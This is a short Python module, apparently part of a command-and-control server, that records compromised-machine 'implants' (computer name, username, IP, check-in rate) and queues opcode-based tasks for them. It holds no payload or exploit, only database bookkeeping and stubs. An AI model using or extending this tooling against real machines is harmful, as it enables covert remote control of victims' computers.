# from database import db
from cvnt.tables import *
from cvnt.implant_pb2 import *

# Task Statuses
STATUS_CREATED  = "implant task created"
STATUS_TASK_RECIEVED = "implant pulled down task"
STATUS_TASK_COMPLETE = "implant successfully compeleted task"
STATUS_TASK_FAILED = "implant failed ot complete task"

def make_implant(ri: RegisterImplant, ip) -> RegisterImplant:
    i = Implant(
        implant_id = ri.ImplantID,
        computer_name = ri.ComputerName,
        username = ri.Username,
        ip_addr = ip,
        checkin_frq = 1000)
    print(i)
    return i

def register_implant(i):
    db.session.add(i)
    db.session.commit()
    return i

def implant_checking_in(iID):
    pass
    # db.query()

def make_task(target_implantID, tr: TaskRequest): # id, task_id, status, implant_guid, task_opcode, task_args):
    t = Task(
        implant_id = target_implantID,
        task_id = tr.TaskID,
        status = STATUS_CREATED,
        task_opcode = tr.Opcode,
        task_args  = tr.Args
    )
    return t
